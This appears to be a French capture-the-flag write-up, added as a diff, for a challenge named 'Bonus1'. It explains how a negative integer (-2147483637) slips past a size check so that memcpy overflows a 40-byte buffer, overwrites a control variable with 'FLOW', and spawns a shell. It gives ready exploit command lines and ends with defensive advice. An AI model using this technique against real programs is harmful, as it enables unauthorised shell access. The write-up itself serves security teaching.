@@ -1,0 +1,119 @@
+# Exploitation de Bonus1 – Integer Overflow et Buffer Overflow
+
+## Analyse du Programme
+
+Le programme exploite une combinaison de conversion d'entier, de vérification de bornes, et de buffer overflow via un calcul mal protégé.
+
+### Code principal (main)
+
+```c
+int main(int argc, char **argv)
+{
+  char buffer[40];           // Buffer de 40 bytes
+  int number;                // Nombre converti depuis argv[1]
+  
+  number = atoi(argv[1]);
+  
+  if (number < 10) {
+    memcpy(buffer, argv[2], number * 4);
+    if (number == 0x574f4c46) { // "FLOW" en little-endian
+      execl("/bin/sh", "sh", 0);
+    }
+    return 0;
+  }
+  else {
+    return 1;
+  }
+}
+```
+
+---
+
+## Points de Théorie
+
+### 1. Integer Overflow
+
+- **Integer overflow** : Dépassement de la capacité d'un entier, menant à des valeurs négatives ou inattendues.
+- Ici, la multiplication `number * 4` peut produire un résultat inattendu si `number` est négatif.
+
+### 2. Buffer Overflow
+
+- **Buffer overflow** : Dépassement de la taille d'un buffer pour écraser des variables ou des adresses de retour.
+- Ici, le buffer de 40 bytes peut être débordé si `memcpy` copie plus de 40 bytes.
+
+### 3. Contradiction apparente des conditions
+
+- Le programme vérifie que `number < 10` mais cherche aussi `number == 0x574f4c46` ("FLOW").
+- Impossible en apparence, mais on peut contourner avec un nombre négatif qui, multiplié par 4, donne un offset précis pour écraser la variable `number` en mémoire.
+
+---
+
+## Schéma mémoire simplifié
+
+```
+| buffer[40] | number (4 bytes) |
+|------------|-----------------|
+```
+- `memcpy(buffer, argv[2], number * 4);` permet d'écrire dans `number` si on copie plus de 40 bytes.
+
+---
+
+## Étapes de l'Exploitation
+
+### 1. Calcul de l'offset
+
+- On veut que `memcpy` écrive exactement 44 bytes (40 pour le buffer + 4 pour écraser `number`).
+- Donc, il faut que `number * 4 = 44` → `number = 11`
+- Mais `11` ne passe pas la condition `number < 10`. Il faut donc un nombre négatif qui, multiplié par 4, donne 44 (en overflow binaire).
+
+### 2. Construction du nombre négatif
+
+- 44 en hexadécimal : `0x2c`
+- En 32 bits, pour obtenir 44 après multiplication par 4, il faut un nombre dont les 2 bits de poids faible sont `11` (car 44/4 = 11).
+- Pour obtenir un nombre négatif, on prend la représentation binaire de -2147483637 :
+  - `0x8000000b` (binaire : `1000 0000 0000 0000 0000 0000 0000 1011`)
+- En décimal : **-2147483637**
+
+### 3. Construction du payload
+
+- **Arg1** : `-2147483637`
+- **Arg2** : 40 "A" + "FLOW" (en little-endian : `\x46\x4c\x4f\x57`)
+
+Exemple :
+```bash
+./bonus1 -2147483637 $(python -c 'print("A"*40 + "FLOW")')
+```
+ou
+```bash
+./bonus1 -2147483637 $(python -c 'print("A"*40 + "\x46\x4c\x4f\x57")')
+```
+
+- Après le memcpy, la variable `number` est écrasée par la valeur "FLOW" (0x574f4c46).
+- Le second test `if (number == 0x574f4c46)` devient vrai, et le shell est lancé.
+
+---
+
+## Explication Technique Détaillée
+
+1. **Phase de vérification**
+   - `number` négatif mais `< 10` → passe la première condition.
+2. **Phase de copie**
+   - `memcpy` copie 44 bytes, écrase la variable `number` juste après le buffer.
+3. **Phase de test magique**
+   - `number` vaut maintenant "FLOW" (0x574f4c46).
+   - Le shell est lancé.
+
+---
+
+## Sécurité
+
+- **Vérification stricte des bornes** : Toujours vérifier la validité des entrées, surtout après conversion.
+- **Protection contre les integer overflows** : Utiliser des fonctions sûres pour les calculs de taille.
+- **Séparation des buffers et des variables critiques** : Ne jamais placer des variables de contrôle juste après des buffers utilisateurs.
+- **Utilisation de protections mémoire** : Stack canaries, ASLR, NX bit.
+
+---
+
+## Résumé
+
+Ce challenge illustre comment un integer overflow combiné à un buffer overflow permet de contourner des vérifications logiques et d'obtenir un shell, même lorsque les conditions semblent contradictoires.
